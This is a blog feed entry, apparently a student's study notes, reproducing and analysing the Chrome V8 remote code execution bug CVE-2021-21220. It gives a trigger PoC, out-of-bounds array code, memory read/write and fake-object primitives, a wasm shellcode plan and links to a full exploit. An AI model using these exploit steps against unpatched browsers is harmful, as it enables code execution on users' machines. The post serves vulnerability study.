{
    "version": "https://jsonfeed.org/version/1",
    "title": "唐仔橙 • All posts by \"浏览器安全\" tag",
    "description": "喜欢探索世界,在读研究生,计算机爱好者的成长记录",
    "home_page_url": "https://tangzichengcc.github.io",
    "items": [
        {
            "id": "https://tangzichengcc.github.io/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/",
            "url": "https://tangzichengcc.github.io/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/",
            "title": "CVE-2021-21220 Chrome v8远程代码执行漏洞复现与分析",
            "date_published": "2022-11-17T14:20:59.000Z",
            "content_html": "<h1 id=\"tips\"><a href=\"#tips\" class=\"headerlink\" title=\"tips:\"></a>tips:</h1><p>标记为橙色的为不严谨,有待研究</p>\n<p><img src=\"/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Untitled.png\" alt=\"Untitled\"></p>\n<h1 id=\"V8-漏洞利用之环境搭建\"><a href=\"#V8-漏洞利用之环境搭建\" class=\"headerlink\" title=\"V8 漏洞利用之环境搭建\"></a><strong><strong>V8 漏洞利用之环境搭建</strong></strong></h1><h2 id=\"一、编译环境搭建\"><a href=\"#一、编译环境搭建\" class=\"headerlink\" title=\"一、编译环境搭建\"></a>一、编译环境搭建</h2><p>以下都出自这篇文章:<a href=\"https://zhuanlan.zhihu.com/p/493674086\">https://zhuanlan.zhihu.com/p/493674086</a></p>\n<p>更新软件列表、更新软件、安装依赖</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get upgrade</span><br><span class=\"line\"></span><br><span class=\"line\">sudo apt install bison cdbs curl flex g++ git python vim pkg-config</span><br></pre></td></tr></table></figure>\n\n<p>安装depot_tools</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir /root/tools &amp;&amp; cd /root/tools</span><br><span class=\"line\">git clone https:<span class=\"comment\">//chromium.googlesource.com/chromium/tools/depot_tools.git /root/tools/depot_tools</span></span><br><span class=\"line\">echo <span class=\"string\">&#x27;export PATH=$PATH:&quot;/root/tools/depot_tools&quot;&#x27;</span> &gt;&gt; /etc/profile</span><br><span class=\"line\">echo <span class=\"string\">&#x27;export PATH=$PATH:&quot;/root/tools/depot_tools&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br><span class=\"line\">source /etc/profile</span><br><span class=\"line\">source ~/.bashrc</span><br></pre></td></tr></table></figure>\n\n<p>安装ninja：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https:<span class=\"comment\">//github.com/ninja-build/ninja.git</span></span><br><span class=\"line\">cd ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; cd ..</span><br><span class=\"line\">echo <span class=\"string\">&#x27;export PATH=$PATH:&quot;$(pwd)/ninja&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>\n\n<p>下载v8</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir /root/v8 &amp;&amp; cd /root/v8</span><br><span class=\"line\">fetch v8  #这个可能会花很长时间，取决于个人的网络环境，如果中断了则 gclient sync同步</span><br><span class=\"line\">cd v8</span><br><span class=\"line\">sudo ./build/install-build-deps.sh --no-chromeos-fonts\t# 在linux系统中这个命令是需要的</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二、找漏洞版本commit\"><a href=\"#二、找漏洞版本commit\" class=\"headerlink\" title=\"二、找漏洞版本commit\"></a>二、找漏洞版本commit</h2><p>编译的话,需要找到漏洞版本的github的commit</p>\n<p>受影响的Chrome最高版本为：<code>89.0.4389.114</code>受影响的V8最高版本为：<code>8.9.255.24</code></p>\n<h3 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h3><p><a href=\"https://omahaproxy.appspot.com/\">https://omahaproxy.appspot.com</a></p>\n<p>通过这个网站可以找漏洞版本的commit</p>\n<p><img src=\"/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Untitled_1.png\" alt=\"Untitled_1\"></p>\n<h3 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h3><p>从漏洞的issue链接<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=821137\">https://bugs.chromium.org/p/chromium/issues/detail?id=821137</a><br>找到修复的commit链接<a href=\"https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d\">https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d</a> ,可以看到漏洞信息、存在漏洞的上一个版本（parent）、diff修复信息和漏洞poc</p>\n<h3 id=\"方法三\"><a href=\"#方法三\" class=\"headerlink\" title=\"方法三\"></a>方法三</h3><p>直接从github找commit</p>\n<p><a href=\"https://github.com/v8/v8/tags?after=8.9.255\">https://github.com/v8/v8/tags?after=8.9.255</a></p>\n<h2 id=\"三、编译\"><a href=\"#三、编译\" class=\"headerlink\" title=\"三、编译\"></a>三、编译</h2><p>分了两个版本,一个是release,一个是debug</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">进入到v8目录,选择好要编译的commit(不然默认编译最新的)</span><br><span class=\"line\">git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599</span><br><span class=\"line\">gclient sync # 同步更新</span><br><span class=\"line\"># 编译可执行文件 (二选一)</span><br><span class=\"line\">tools/dev/v8gen.py x64.debug</span><br><span class=\"line\">ninja -C out.gn/x64.debug d8</span><br><span class=\"line\">上面和下面是二选一</span><br><span class=\"line\">tools/dev/v8gen.py x64.relase</span><br><span class=\"line\">ninja -C out.gn/x64.relase d8</span><br></pre></td></tr></table></figure>\n\n<p>这里有个坑,就是,debug版本会有很多调试信息,release没有,并且,release不能使用v8的gdb脚本(如job命令),如果想要release能使用gdb脚本的话,需要执行完<code>tools/dev/v8gen.py x64.release</code>后在生成的 <code>out.gn/x64.release/args.gn</code>中追加</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v8_enable_backtrace = <span class=\"literal\">true</span></span><br><span class=\"line\">v8_enable_disassembler = <span class=\"literal\">true</span></span><br><span class=\"line\">v8_enable_object_print = <span class=\"literal\">true</span></span><br><span class=\"line\">v8_enable_verify_heap = <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n\n<p>参考:<a href=\"https://www.cjovi.icu/CVE/1586.html\">https://www.cjovi.icu/CVE/1586.html</a></p>\n<h2 id=\"四、配置v8自带的gdb脚本-方便调试\"><a href=\"#四、配置v8自带的gdb脚本-方便调试\" class=\"headerlink\" title=\"四、配置v8自带的gdb脚本,方便调试\"></a>四、配置v8自带的gdb脚本,方便调试</h2><p>v8自带了gdb调试脚本</p>\n<p><img src=\"/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Untitled_2.png\" alt=\"Untitled_2\"></p>\n<p>1.把v8&#x2F;tools&#x2F;gdbinit内容加到~&#x2F;.gdbint里面</p>\n<p>2.将v8&#x2F;tools&#x2F;gdb-v8-support.py放到一个目录(当前也行)</p>\n<p>在~&#x2F;.gdbint开头加入 <code>source /自定义目录/gdb-v8-support.py</code></p>\n<p>参考:<a href=\"https://paper.seebug.org/1821/\">https://paper.seebug.org/1821/</a></p>\n<h1 id=\"RCE的完整步骤\"><a href=\"#RCE的完整步骤\" class=\"headerlink\" title=\"RCE的完整步骤\"></a>RCE的完整步骤</h1><h2 id=\"incorrect-numeric-理解漏洞本身\"><a href=\"#incorrect-numeric-理解漏洞本身\" class=\"headerlink\" title=\"incorrect numeric (理解漏洞本身)\"></a>incorrect numeric (理解漏洞本身)</h2><p>POC</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">const</span> _arr = new Uint32Array([<span class=\"number\">2</span>**<span class=\"number\">31</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">function <span class=\"title function_\">foo</span><span class=\"params\">(a)</span> &#123;</span><br><span class=\"line\">    var x = <span class=\"number\">1</span>;</span><br><span class=\"line\">    x = (_arr[<span class=\"number\">0</span>] ^ <span class=\"number\">0</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    x = Math.<span class=\"built_in\">abs</span>(x);</span><br><span class=\"line\">    x -= <span class=\"number\">2147483647</span>;</span><br><span class=\"line\">    x = Math.max(x, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    x -= <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(x==<span class=\"number\">-1</span>) x = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    var arr = new Array(x);</span><br><span class=\"line\">    arr.shift();</span><br><span class=\"line\">    var cor = [<span class=\"number\">1.1</span>, <span class=\"number\">1.2</span>, <span class=\"number\">1.3</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> [arr, cor];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://paper.seebug.org/1850/\">https://paper.seebug.org/1850/</a></p>\n<p><a href=\"https://paper.seebug.org/1556/\">https://paper.seebug.org/1556/</a></p>\n<p>那么 这个长度-1的数组有什么用呢??????,见下面 Array.shift</p>\n<h2 id=\"OOB-out-of-bounds-memory-access-越界访问\"><a href=\"#OOB-out-of-bounds-memory-access-越界访问\" class=\"headerlink\" title=\"OOB (out-of-bounds memory access) 越界访问\"></a>OOB (out-of-bounds memory access) 越界访问</h2><p>abusing array bounds check elimination.</p>\n<p>有历史沿革,之前是<a href=\"https://chromium.googlesource.com/v8/v8.git/+/7bb6dc0e06fa158df508bc8997f0fce4e33512a5\">bounds-check elimination</a>的问题,后来去掉了,但又有新的利用方式</p>\n<h3 id=\"利用Array-shift实现oob\"><a href=\"#利用Array-shift实现oob\" class=\"headerlink\" title=\"利用Array.shift实现oob\"></a>利用Array.shift实现oob</h3><p><a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=1198696\">https://bugs.chromium.org/p/chromium/issues/detail?id=1198696</a></p>\n<p>而负长度被视为一个正的大长度,因此该数组允许访问任意 OOB 数据。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function <span class=\"title function_\">foo</span><span class=\"params\">(a)</span> &#123;</span><br><span class=\"line\">        let x = <span class=\"number\">-1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (a) x = <span class=\"number\">0xFFFFFFFF</span>;</span><br><span class=\"line\">        var arr = new Array(Math.sign(<span class=\"number\">0</span> - Math.max(<span class=\"number\">0</span>, x, <span class=\"number\">-1</span>)));<span class=\"comment\">//构造长度为-1的数组</span></span><br><span class=\"line\">        arr.shift();</span><br><span class=\"line\">        let local_arr = Array(<span class=\"number\">2</span>);</span><br><span class=\"line\">        console.<span class=\"built_in\">log</span>(<span class=\"string\">&quot;现在长度&quot;</span>+arr.length)</span><br><span class=\"line\">        local_arr[<span class=\"number\">0</span>] = <span class=\"number\">5.1</span>;<span class=\"comment\">//4014666666666666</span></span><br><span class=\"line\">        let buff = new LeakArrayBuffer(<span class=\"number\">0x1000</span>);<span class=\"comment\">//byteLength idx=8</span></span><br><span class=\"line\">        arr[<span class=\"number\">0</span>] = <span class=\"number\">0x1122</span>; <span class=\"comment\">//</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> [arr, local_arr, buff];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (var i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x10000</span>; ++i)</span><br><span class=\"line\">        foo(<span class=\"literal\">false</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    gc(); gc(); </span><br><span class=\"line\">    [corrput_arr, rwarr, corrupt_buff] = foo(<span class=\"literal\">true</span>);</span><br><span class=\"line\">\t\tcorrput_arr[<span class=\"number\">12</span>] = <span class=\"number\">0x22444</span>;</span><br><span class=\"line\">\t\tdelete corrput_arr;</span><br></pre></td></tr></table></figure>\n\n<p>  通过上述漏洞,我们实现了一个长度为-1的数组arr(corrput_arr),-1扩展为无符号,就是0xffffffff,是一个很大的正数,从而可以实现越界读写,在此基础之上,进行后面的利用</p>\n<p>  1.获得了一个0xfffffff(-1长度)数组 arr(corrput_arr)</p>\n<p>  2.声明一个local_arr(rwarr),长度为2, 接着利用arr的oob,溢出修改它的长度为0x22444,也就是corrput_arr[12] &#x3D; 0x22444; (或者说 arr[12] &#x3D; 0x22444;) 这一位对应的是数组的长度</p>\n<p>  3.声明长度为0x1000的ArrayBuffer(corrupt_buff)</p>\n<p>  在2、3两步,我们能够得到一个数组和一个ArrayBuffer,但是我们还不能任意读写这个ArrayBuffer,一种实现方法是,通过corrput_arr的溢出,将rwarr的长度变长,覆盖到ArrayBuffer,于是我们就能够对他进行任意读写,从而实现对内存任意地址读写(其实是受限的,rwx)</p>\n<p>  为什么要强调ArrayBuffer呢?且看下面</p>\n<p>  疑问:从而实现对rwarr(local_arr)的跨界访问,为啥要这样呢?? 为啥不直接用arr</p>\n<h2 id=\"越界访问rwarr数组-实现可控的JSArrayBuffer\"><a href=\"#越界访问rwarr数组-实现可控的JSArrayBuffer\" class=\"headerlink\" title=\"越界访问rwarr数组(实现可控的JSArrayBuffer)\"></a>越界访问rwarr数组(实现可控的JSArrayBuffer)</h2><p>  这张图比较形象,我们现在可以越界访问的是corrupt_arr,然后新建了一个rwarr数组,那么可以越界访问,把rwarr的长度修改的大一点,对应代码 corrput_arr[12] &#x3D; 0x22444;</p>\n<p>  那么为什么数组的第13位是代表着它的长度呢?这个具体原理方法在参考博客里,和它的数据结构有关.</p>\n<p><img src=\"/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Untitled_3.png\" alt=\"Untitled_3\"></p>\n<h2 id=\"越界访问corrupt-buff-实现任意地址读写\"><a href=\"#越界访问corrupt-buff-实现任意地址读写\" class=\"headerlink\" title=\"越界访问corrupt_buff(实现任意地址读写)\"></a><strong><strong>越界访问corrupt_buff(实现任意地址读写)</strong></strong></h2><p><a href=\"http://www.hackdig.com/03/hack-70813.htm\">http://www.hackdig.com/03/hack-70813.htm</a></p>\n<p>  背景知识:什么是backing_store? 对漏洞利用有什么用?</p>\n<p>  backing_store指向初始化JSArrayBuffer时用户申请大小的堆，如果我们控制了一个JSArrayBuffer相当于一个指针和指针的内容可以同时改写。这样我们改写backing_store读取控制的JSArrayBuffer的内容就是任意地址读；我们改写backing_store修改控制的JSArrayBuffer的内容就是任意地址写。</p>\n<p>  如果我们将这个backing_store指针修改为我们想要写入的内存地址，那么我们再调用view.setUint32(0, poc, true) 类似指令时，实际上就是向指定内存地址处写入了poc，从而达到任意地址写。</p>\n<h3 id=\"任意地址写-通过伪造backing-store\"><a href=\"#任意地址写-通过伪造backing-store\" class=\"headerlink\" title=\"任意地址写(通过伪造backing_store)\"></a>任意地址写(通过伪造backing_store)</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function <span class=\"title function_\">setbackingStore</span><span class=\"params\">(hi, low)</span> &#123;</span><br><span class=\"line\">           rwarr[<span class=\"number\">4</span>] = i2f(fLow(rwarr[<span class=\"number\">4</span>]), hi);</span><br><span class=\"line\">           rwarr[<span class=\"number\">5</span>] = i2f(low, fHi(rwarr[<span class=\"number\">5</span>]));</span><br><span class=\"line\">       &#125;</span><br></pre></td></tr></table></figure>\n\n<p>   从corrupt_buff中声明一个Dataview,而backing_store记录的就是实际DataView的内存地址。如果我们将这个backing_store指针修改为我们想要写入的内存地址，那么我们再调用view.setUint32(0, poc, true) 类似指令时，实际上就是向指定内存地址处写入了poc，从而达到任意地址写。</p>\n<p>  那么我们已经可以利用rwarr实现对corrupt_buff的任意读写,即可以任意修改backing_store.</p>\n<h3 id=\"任意地址读-类型混淆\"><a href=\"#任意地址读-类型混淆\" class=\"headerlink\" title=\"任意地址读(类型混淆)\"></a>任意地址读(类型混淆)</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function <span class=\"title function_\">leakObjLow</span><span class=\"params\">(o)</span> &#123;</span><br><span class=\"line\">           corrupt_buff.slot = o;</span><br><span class=\"line\">           <span class=\"keyword\">return</span> (fLow(rwarr[<span class=\"number\">9</span>]) - <span class=\"number\">1</span>);</span><br><span class=\"line\">       &#125;</span><br></pre></td></tr></table></figure>\n\n<p>  leakObjLow函数使用corrupt_buff的slot属性，修改该属性为某一对象o，那么o的地址就会被写入到corrupt_buff所在的内存区间中，然后利用rwarr的溢出访问该值，实现泄露。</p>\n<p>  这里是不是用了类型混淆??</p>\n<h3 id=\"利用oob造成类型混淆-那怎么利用呢\"><a href=\"#利用oob造成类型混淆-那怎么利用呢\" class=\"headerlink\" title=\"利用oob造成类型混淆,那怎么利用呢?\"></a>利用oob造成类型混淆,那怎么利用呢?</h3><p>那出现类型混淆怎么利用呢？举个例子，如果我们定义一个FloatArray浮点数数组A，然后定义一个对象数组B。正常情况下，访问A[0]返回的是一个浮点数，访问B[0]返回的是一个对象元素。如果将B的类型修改为A的类型，那么再次访问B[0]时，返回的就不是对象元素B[0]，而是B[0]对象元素转换为浮点数即B[0]对象的内存地址了；如果将A的类型修改为B的类型，那么再次访问A[0]时，返回的就不是浮点数A[0]，而是以A[0]为内存地址的一个JavaScript对象了。</p>\n<p><a href=\"https://www.freebuf.com/vuls/203721.html\">https://www.freebuf.com/vuls/203721.html</a></p>\n<p><strong>addressOf 泄露某个对象的内存地址</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 泄露某个object的地址</span></span><br><span class=\"line\">function <span class=\"title function_\">addressOf</span><span class=\"params\">(obj_to_leak)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    obj_array[<span class=\"number\">0</span>] = obj_to_leak;</span><br><span class=\"line\">    obj_array.oob(float_array_map);</span><br><span class=\"line\">    let obj_addr = f2i(obj_array[<span class=\"number\">0</span>]) - <span class=\"number\">1</span>n;</span><br><span class=\"line\">    obj_array.oob(obj_array_map); <span class=\"comment\">// 还原array类型以便后续继续使用</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> obj_addr;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>fakeObject 将指定内存强制转换为一个js对象(有什么用呢?)</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 将某个addr强制转换为object对象</span></span><br><span class=\"line\">function <span class=\"title function_\">fakeObject</span><span class=\"params\">(addr_to_fake)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    float_array[<span class=\"number\">0</span>] = i2f(addr_to_fake + <span class=\"number\">1</span>n);</span><br><span class=\"line\">    float_array.oob(obj_array_map);</span><br><span class=\"line\">    let faked_obj = float_array[<span class=\"number\">0</span>];</span><br><span class=\"line\">    float_array.oob(float_array_map); <span class=\"comment\">// 还原array类型以便后续继续使用</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> faked_obj;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"如何实现任意地址读写：构造AAR-x2F-AAW原语\"><a href=\"#如何实现任意地址读写：构造AAR-x2F-AAW原语\" class=\"headerlink\" title=\"如何实现任意地址读写：构造AAR&#x2F;AAW原语\"></a><strong><strong>如何实现任意地址读写：构造AAR&#x2F;AAW原语</strong></strong></h3><p><a href=\"https://paper.seebug.org/1821/#wasm\">https://paper.seebug.org/1821/#wasm</a></p>\n<p>fakeObject强制将一块内存伪造成一个数组对象??? 它的elements 指针是可控的,而这个指针指向了存储数组元素内容的内存地址。如果我们将这个指针修改为我们想要访问的内存地址，那后续我们访问这个数组对象的内容,实际上访问的就是我们修改后的内存地址指向的内容，这样也就实现了对任意指定地址的内存访问读写效果了。</p>\n<p>哦哦哦因为可以任意访问,把这个当成一个数组对象了,那么对这个数组,我们是可以任意读取和修改的????</p>\n<h2 id=\"wasm-webassembly-实现执行shellcode\"><a href=\"#wasm-webassembly-实现执行shellcode\" class=\"headerlink\" title=\"wasm(webassembly) 实现执行shellcode\"></a>wasm(webassembly) 实现执行shellcode</h2><p><a href=\"https://paper.seebug.org/1821/#wasm\">https://paper.seebug.org/1821/#wasm</a></p>\n<p><a href=\"https://www.freebuf.com/vuls/203721.html\">https://www.freebuf.com/vuls/203721.html</a></p>\n<p>简单来说，wasm就是可以让JavaScript直接执行高级语言生成的机器码的一种技术。</p>\n<p><a href=\"https://sensepost.com/blog/2018/introduction-to-webassembly/\">https://sensepost.com/blog/2018/introduction-to-webassembly/</a></p>\n<h3 id=\"利用思路\"><a href=\"#利用思路\" class=\"headerlink\" title=\"利用思路\"></a>利用思路</h3><p>首先加载一段wasm代码到内存中<br>然后通过addresssOf原语找到存放wasm的内存地址<br>接着通过任意地址写原语用shellcode替换原本wasm的代码内容<br>最后调用wasm的函数接口即可触发调用shellcode</p>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><h2 id=\"漏洞复现参考\"><a href=\"#漏洞复现参考\" class=\"headerlink\" title=\"漏洞复现参考\"></a>漏洞复现参考</h2><p><a href=\"https://blog.csdn.net/m0_56642842/article/details/118358830\">https://blog.csdn.net/m0_56642842&#x2F;article&#x2F;details&#x2F;118358830</a> 这个就是教你怎么复现,不涉及原理</p>\n<p><a href=\"https://www.cnblogs.com/7omss/p/15661338.html\">https://www.cnblogs.com/7omss/p/15661338.html</a> + 1</p>\n<p>exploit:<a href=\"https://share.weiyun.com/EXlNm02A\">https://share.weiyun.com/EXlNm02A</a> </p>\n<p>浏览器:<a href=\"https://share.weiyun.com/fZLcxFe9\">https://share.weiyun.com/fZLcxFe9</a></p>\n<h2 id=\"漏洞分析、调试及RCE步骤参考\"><a href=\"#漏洞分析、调试及RCE步骤参考\" class=\"headerlink\" title=\"漏洞分析、调试及RCE步骤参考\"></a>漏洞分析、调试及RCE步骤参考</h2><p><a href=\"https://zhuanlan.zhihu.com/p/365297858\">https://zhuanlan.zhihu.com/p/365297858</a></p>\n<p><a href=\"https://blog.csdn.net/smellycat000/article/details/116078164\">https://blog.csdn.net/smellycat000/article/details/116078164</a></p>\n<p><a href=\"https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce\">https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce</a></p>\n<p><a href=\"https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/\">https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/</a></p>\n<p><a href=\"https://github.com/security-dbg/CVE-2021-21220/blob/main/exploit.js\">https://github.com/security-dbg/CVE-2021-21220/blob/main/exploit.js</a></p>\n<p><a href=\"https://buaq.net/go-97833.html\">https://buaq.net/go-97833.html</a></p>\n<p><a href=\"https://ruan777.github.io/2022/01/18/chrome-cve-2021-21220%E5%88%86%E6%9E%90/\">https://ruan777.github.io/2022/01/18/chrome-cve-2021-21220分析/</a></p>\n<p><a href=\"https://github.com/Bounty-Team/Bounty-Team.github.io/blob/e0f717119de0c8a46aef0bde3e2bf2a4a9fe71bc/_posts/2021-04-16-CVE-2021-21220.md\">https://github.com/Bounty-Team/Bounty-Team.github.io/blob/e0f717119de0c8a46aef0bde3e2bf2a4a9fe71bc/_posts&#x2F;2021-04-16-CVE-2021-21220.md</a></p>\n<p><a href=\"https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce\">https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce</a></p>\n<p><a href=\"https://github.com/singularseclab/Slides/blob/main/2021/chrome_exploitation-zer0con2021.pdf\">https://github.com/singularseclab/Slides/blob/main/2021/chrome_exploitation-zer0con2021.pdf</a></p>\n<p><a href=\"https://www.sohu.com/a/383228797_354899\">https://www.sohu.com/a/383228797_354899</a></p>\n<p><a href=\"https://bounty-team.github.io/vulnerability%20analysis/2021/04/16/CVE-2021-21220/\">https://bounty-team.github.io/vulnerability analysis/2021/04/16/CVE-2021-21220/</a></p>\n<p><a href=\"https://www.freebuf.com/vuls/269629.html\">https://www.freebuf.com/vuls/269629.html</a></p>\n<p><a href=\"https://www.cjovi.icu/CVE/1586.html\">https://www.cjovi.icu/CVE/1586.html</a></p>\n<p><a href=\"https://xz.aliyun.com/t/5190\">https://xz.aliyun.com/t/5190</a>。<strong>v8 exploit入门[PlaidCTF roll a d8]</strong></p>\n<p><a href=\"https://gtoad.github.io/2019/07/25/V8-Debug/\">https://gtoad.github.io/2019/07/25/V8-Debug/</a>  <strong><strong>V8引擎漏洞分析环境与调试方法基础</strong></strong></p>\n<p><a href=\"https://paper.seebug.org/1850/\">https://paper.seebug.org/1850/</a>   <strong><strong>从 0 开始学 V8 漏洞利用之 CVE-2021-21220（八）</strong></strong></p>\n<p><a href=\"https://www.freebuf.com/vuls/230182.html\">https://www.freebuf.com/vuls/230182.html</a>。<strong><strong>v8利用入门：从越界访问到RCE</strong></strong></p>\n<p><a href=\"https://www.freebuf.com/vuls/203721.html\">https://www.freebuf.com/vuls/203721.html</a></p>\n<p><a href=\"https://www.cjovi.icu/CVE/1586.html\">https://www.cjovi.icu/CVE/1586.html</a></p>\n<p><a href=\"https://tiszka.com/blog/CVE_2021_21225.html\">https://tiszka.com/blog/CVE_2021_21225.html</a></p>\n<p><a href=\"https://kiprey.github.io/2021/01/v8-turboFan/\">https://kiprey.github.io/2021/01/v8-turboFan/</a></p>\n",
            "tags": [
                "浏览器安全"
            ]
        }
    ]
}